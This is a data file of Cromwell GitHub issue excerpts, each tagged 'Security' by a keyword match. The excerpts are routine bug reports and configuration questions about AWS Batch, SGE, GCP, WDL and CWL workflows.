Security,"<!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->; Trying to set up a genomics workflow with AWS backend; References : https://aws.amazon.com/blogs/compute/using-cromwell-with-aws-batch/; https://cromwell.readthedocs.io/en/stable/tutorials/AwsBatch101/ . <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->; AWS ; java -Dconfig.file=aws-cromwell-batch.conf -jar cromwell-75.jar run hello.wdl -i hello.inputs; ; ![AWS-Batch](https://user-images.githubusercontent.com/25282254/153039990-0d0b2c96-a33b-454f-9617-aee83137337a.PNG); [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026009/Cromwell-Error.docx); ; <!-- Paste/Attach your workflow if possible: -->; java -Dconfig.file=aws-cromwell-batch.conf -jar cromwell-75.jar run hello.wdl -i hello.inputs. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; include required(classpath(""application"")). aws {. application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; ]; region = ""us-east-1""; }; engine {; filesystems {; s3.auth = ""default""; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; docker {; hash-lookup {; enabled = false; # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub and gcr; method = ""remote""; }; }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; concurrent-job-limit = 1000; root = ""s3://cromwell-aws-hello/cromwell-execution""; auth = ""default""; default-runtime-attributes {; queueArn = ""arn:aws:batch:us-east-1:XXXXXXXXX:job-queue/python-batch"" ,",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6671:1730,PASSWORD,PASSWORDS,1730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671,1,['PASSWORD'],['PASSWORDS']
Security,"<!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->; ![2018-10-26 23 24 43](https://user-images.githubusercontent.com/4966343/47572651-79585300-d976-11e8-8027-a9bade3f91d4.png). <!-- Which backend are you running? -->; aws. <!-- Paste/Attach your workflow if possible: -->; https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/integrationTestCases/germline/haplotype-caller-workflow/HaplotypeCallerWF.aws.wdl. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; AWS Access Key ID [****************R62Q]: ; AWS Secret Access Key [****************uDg5]:; Default region name [ap-northeast-2]:; Default output format [None]:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4321:545,PASSWORD,PASSWORDS,545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4321,3,"['Access', 'PASSWORD']","['Access', 'PASSWORDS']"
Security,"<!-- Which backend are you running? -->; SGE. conf:; ```; include required(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }; workflow-options {; workflow-log-temporary = false; }; backend {; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; filesystems {; local {; caching {; # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:; duplication-strategy: [; ""soft-link"", ""copy""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # Default: file; hashing-strategy: ""path""; }; }; }; ...; backend.default = SGE; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql://0.0.0.0:40001/testuser_db?useSSL=false&rewriteBatchedStatements=true""; user = ""fake""; password = ""fake""; driver = ""com.mysql.jdbc.Driver""; connectionTimeout = 5000; }; }. system {; # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; lines = 128000000; string = 128000000; json = 128000000; tsv = 128000000; map = 128000000; object = 128000000; }; }. ```. <!-- Paste/Attach your workflow if possible: -->; a modified version of : https://github.com/gatk-workflows/gatk4-data-processing. [workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log](https://github.com/broadinstitute/cromwell/files/2143529/workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log). A workflow is failing. It looks like cromwell attempts to localise some folder, ; ```/share/ScratchGeneral/evaben/cromwell/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/0263ce1e-e1da-44c4-a49f-56fea7a6e1ea/call-SamToFastqAndBwaMem/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3825:615,hash,hash,615,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3825,4,['hash'],"['hash', 'hashed', 'hashing-strategy']"
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. **Which backend are you running?**. broadinstitute/cromwell:36. **Paste/Attach your workflow if possible**. For any workflow, when I query its metadata endpoint with `excludeKey=calls` parameter, it returns a response with all `""calls""` key nevertheless. This doesn't seem to happen to other keys, like `inputs` or `submittedFiles`. Excluding `calls` would make a huge difference for us, because for large workflows it takes a long time for Cromwell to aggregate all calls, the response becomes large, and sometimes it even timeouts. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4362:1197,PASSWORD,PASSWORDS,1197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4362,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3781:754,PASSWORD,PASSWORDS,754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3781,6,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Hi folks,. I try to launch cromwell in its server mode, however I get the following error:. ```; java -jar ./cromwell-34.jar server; Exception in thread ""main"" java.lang.VerifyError: Uninitialized object exists on backward branch 209; Exception Details:; Location:; scala/collection/immutable/HashMap$HashTrieMap.split()Lscala/collection/immutable/Seq; @249: goto; Reason:; Error exists in the bytecode; Bytecode:; 0x0000000: 2ab6 0060 04a0 001e b200 b8b2 00bd 04bd; 0x0000010: 0002 5903 2a53 c000 bfb6 00c3 b600 c7c0; 0x0000020: 00c9 b02a b600 36b8 0040 3c1b 04a4 015e; 0x0000030: 1b05 6c3d 2a1b 056c 2ab6 0036 b700 cb3e; 0x0000040: 2ab6 0036 021d 787e 3604 2ab6 0036 0210; 0x0000050: 201d 647c 7e36 05bb 0019 59b2 00bd 2ab6; 0x0000060: 0038 c000 bfb6 00cf b700 d21c b600 d63a; 0x0000070: 0619 06c6 001a 1906 b600 dac0 0086 3a07; 0x0000080: 1906 b600 ddc0 0086 3a08 a700 0dbb 00df; 0x0000090: 5919 06b7 00e2 bf19 073a 0919 083a 0abb; 0x00000a0: 0002 5915 0419 09bb 0019 59b2 00bd 1909; 0x00000b0: c000 bfb6 00cf b700 d203 b800 e83a 0e3a. ```. OS: redhat 6.9 ; Java: ; ```; java -version; java version ""1.8.0_20""; Java(TM) SE Runtime Environment (build 1.8.0_20-b26); Java HotSpot(TM) 64-Bit Se",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4082:754,PASSWORD,PASSWORDS,754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4082,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I am running Cromwell on GCP, launching a workflow that shards into ~5,000 pieces. I am getting the following error: `cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out`. ```; 2019-04-29 00:02:13,419 cromwell-system-akka.dispatchers.backend-dispatcher-139 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(95b34a77)vcf2bigquery.convertVCF:2058:1]: Status chang; e from Running to Success; 2019-04-29 00:02:24,760 cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:171); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:975); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:933); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStre",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914:754,PASSWORD,PASSWORDS,754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; The [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf) file seems to mix multiple styles in terms of delimiters. Some entries are colon delimited as if they were from JSON, e.g.:. ```; workflow-options {; # These workflow options will be encrypted when stored in the database; #encrypted-fields: []. # AES-256 key to use to encrypt the values in `encrypted-fields`; #base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". # Directory where to write per workflow logs; #workflow-log-dir: ""cromwell-workflow-logs"". # When true, per workflow logs will be deleted after copying; #workflow-log-temporary: true. # Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; # Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; #workflow-failure-mode: ""ContinueWhilePossible"". default {; # When a workflow type is not provided on workflow submission, this specifies the default type.; #workflow-type: WDL. # When a workflow type version is not provided on workflow submission, this specifies th",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4913:754,PASSWORD,PASSWORDS,754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4913,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->; Backend: Local. Several basic array functions are not working on optional arrays. Test code passes wdltool validate with no errors.; Tested types: Array[String]? and Array[Int]?; ### Length(); WDL code:; ```; Array[String]? strings; Int num = length(strings); ```; Error:; ```; [2018-10-08 13:12:09,55] [error] WorkflowManagerActor Workflow 3dfb9c92-4e2e-4754-a35e-cfcbf9d6c006 failed (during MaterializingWorkflowDescriptorState): Workflow input processing failed:; Workflow has invalid declarations: Could not evaluate workflow declarations:; Test_optional.num:; length() expects one parameter of type Array but got one parameter of type Array[String]?; ```; ### Indexing; WDL code:; ```; Array[String]? strings. scatter (idx in range(4)) { # strings is provided in the JSON file as an array of 4 strings; call testtask{input: str=strings[idx]}; }; ```; Error:; ```; [2018-10-08 13:27:31,22] [error] WorkflowManagerActor Workflow c2ac7273-c209-4e74-b1f0-a208e89922d8 failed (during ExecutingWorkflowState): Can't index Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""1"", ""2"", ""3"", ""4""]))) with index Success(WdlInteger(0)); wdl4s.wdl.WdlExpressionException: Can't index Success(WdlOptionalValue(WdlMaybeEmptyArrayType(WdlStringType),Some([""1"", ""2"", ""3"", ""4""]))) with index Success(WdlInteger(0)); ```; ### Zip(); WDL code:; ```; Array",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218:750,validat,validate,750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218,1,['validat'],['validate']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->; Backend:; Local, no conf file. <!-- Paste/Attach your workflow if possible: -->. Workflow: Files are here:; https://github.com/FredHutch/reproducible-workflows/tree/master/CWL/SingleStepWorkflow. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Details (see also [this post](https://gatkforums.broadinstitute.org/wdl/discussion/23265/cwl-workflow-fails-running-locally#latest)):. I can run this workflow just fine using cwltool/cwl-runner as follows:. ```; cwl-runner bwa-memWorkflow.cwl localInputs.yml; ```. When I try and run it with cromwell I get an error that ""The job was aborted from outside Cromwell"" but I definitely did not abort it myself. Here is the command I used to run this workflow in Cromwell:. ```; java -jar cromwell-36.jar run bwa-memWorkflow.cwl -i localInputs.yml -p bwa-pe.cwl.zip; ```. (`bwa-pe.cwl.zip` just contains the dependency `bwa-pe.cwl`). And here's the full output of it:. https://gist.github.com/dtenenba/61bcf60f129b817cd894ee222789369a. My ultimate goal is to switch over to the AWS Batch back end (in case you are wondering why I don't just stick with cwltool) but first I wanted to get the workflow running locally in cromwell. Any ideas about this?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4587:900,PASSWORD,PASSWORDS,900,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4587,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->; Hi all,. When running a workflow with `write_objects(Array[Struct])` in a task, the workflow fails with **runtime** error `Failed to evaluate input 'out' (reason 1 of 1): Failed to write_objects(...) (reason 1 of 1): Cannot TSV serialize a Array[WomCompositeType {\n a -> String \n}] (valid types are Array[Primitive], Array[Array[Primitive]], or Array[Object])` **if the array is empty**. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->; ```wdl; version 1.0. struct Input {; String a; }. workflow Test {; call test; }. task test {; input {; Array[Input] inputs = []; }. File out = write_objects(inputs). command {; cat '~{out}'; }. runtime {; docker: 'debian:stable-slim'; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; Our Cromwell build is `37-a52c415-SNAP` (config available upon request)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4595:1390,PASSWORD,PASSWORDS,1390,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4595,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Hello,. I'm wondering if there is a way to specify the `zones` in Cromwell's configuration file that overwrites all the jobs executed through the Cromwell server running it. . When checking the documentation, I only found `config.default-runtime-attributes`, which only works when WDL tasks do not specify `zones`. I also see `config.runtime-attributes`, but it did not work. Could you please guide me on the issue? Thanks!. Sincerely,; Yiming",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6493:882,PASSWORD,PASSWORDS,882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6493,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Hi Cromwell team,; I am running a Cromwell server on Google Cloud have recently upgraded from Cromwell 50 to 53. I am running into an issue that I believe relates to how the new `monitoring_image_script` interacts with the docker entrypoint. I have docker images where each container needs to ping a license server for authentication, and this happens via and `ENTRYPOINT`-executed script called `auth.sh`. With Cromwell 53, this is no longer being run when the container is being executed. This is how the actual docker command . ```; # Cromwell 53; 2020/09/30 13:07:42 Running user action: docker run -v /mnt/local-disk:/cromwell_root --entrypoint=/bin/bash gcr.io/bioskryb/sentieon-201911-run@sha256:b4af9423297bb6566763b2c47b1da1620a68a4d34c210f0786a34a0ae85f62db /cromwell_root/script ; ```. ```; #Cromwell 50; 2020/09/23 06:03:37 Running user action: docker run -v /mnt/local-disk:/cromwell_root --entrypoint= gcr.io/bioskryb/sentieon-201911-run@sha256:b4af9423297bb6566763b2c47b1da1620a68a4d34c210f0786a34a0ae85f62db /bin/bash /cromwell_root/script ; ```. I h",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5901:882,PASSWORD,PASSWORDS,882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5901,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Hi,. I recently encountered an issue on running Cromwell jobs on AWS Batch. In brief, all of my testing WDL jobs failed with the following error message:. ```; 2021-09-23 00:08:18,813 INFO - Submitting taskId: cumulus.cluster-None-1, job definition : arn:aws:batch:us-west-2:752311211819:job-definition/cromwell_quay_io_cumulus_cumulus_1_4_377407181fbea1f33a22931df258b16d20d4c6ab3:1, script: s3://gred-cumulus-dev/scripts/c157137e2097795846ae1f4069ccd7a2; 2021-09-23 00:08:20,269 cromwell-system-akka.dispatchers.backend-dispatcher-118 INFO - AwsBatchAsyncBackendJobExecutionActor [UUID(cf00212c)cumulus.cluster:NA:1]: job id: 12836c6a-6d1a-4429-bb86-68b8f9883acf; 2021-09-23 00:08:20,287 cromwell-system-akka.dispatchers.backend-dispatcher-118 INFO - AwsBatchAsyncBackendJobExecutionActor [UUID(cf00212c)cumulus.cluster:NA:1]: Status change from - to Initializing; 2021-09-23 00:12:17,120 cromwell-system-akka.dispatchers.backend-dispatcher-136 INFO - AwsBatchAsyncBackendJobExecutionActor [UUID(cf00212c)cumulus.cluster:NA:1]: Status change from Initializing to R",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6504:882,PASSWORD,PASSWORDS,882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; Hello,. I wonder if the LSF job array functionality was implemented in the latest Cromwell releases?. I found a couple of previous mentions on this (for AWS) a while ago:; [1](https://github.com/broadinstitute/cromwell/issues/4496); [2](https://github.com/broadinstitute/cromwell/issues/4707). If such functionality exists, are there docs on this subject?. Thank you!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6379:882,PASSWORD,PASSWORDS,882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6379,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I want to set AWS_BATCH_JOB_ATTEMPT in my pipeline. My pipeline is a cromwell wdl pipeline which utilizes AWS batch as the backend. I submit jobs like so. ```; curl -X POST ""http://172.31.77.179:8000/api/workflows/v1"" \; -H ""accept: application/json"" \; -F ""workflowSource=@rnaseq_pipeline.wdl"" \; -F ""workflowInputs=@rnaseq_pipeline.json"" \; -F ""workflowDependencies=@tasks.zip""; ```; From what I read on aws, they seem to set the environment variables for jobs through the websites GUI. I submit my jobs with curl, how would I add the AWS_BATCH_JOB_ATTEMPT value?. Any help would be appreciated, I am not familiar with either cromwell or batch.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5511:882,PASSWORD,PASSWORDS,882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5511,1,['PASSWORD'],['PASSWORDS']
Security,"<!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I'm having issues running CWL workflows with Cromwell 44 whereas previously with 36.1, it passes. I have workarounds but I'm wondering which ones are issues and which ones are design changes. Here's my test script:; ```; #!/bin/bash; set -o pipefail; set -o nounset; set -o xtrace. wget https://github.com/broadinstitute/cromwell/releases/download/44/cromwell-44.jar; wget https://github.com/broadinstitute/cromwell/releases/download/36.1/cromwell-36.1.jar; wget https://raw.githubusercontent.com/common-workflow-language/common-workflow-language/master/v1.0/examples/1st-tool.cwl; wget https://raw.githubusercontent.com/common-workflow-language/common-workflow-language/master/v1.0/examples/echo-job.yml; zip imports.zip 1st-tool.cwl echo-job.yml; java -jar cromwell-36.1.jar run 1st-tool.cwl --inputs echo-job.yml; java -jar cromwell-36.1.jar run 1st-tool.cwl --inputs echo-job.yml --type cwl; java -jar cromwell-36.1.jar run 1st-tool.cwl --inputs echo-job.yml --type cwl --imports imports.zip; java -jar cromwell-44.jar run 1st-tool.cwl --inputs echo-job.yml; jav",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5085:882,PASSWORD,PASSWORDS,882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5085,1,['PASSWORD'],['PASSWORDS']
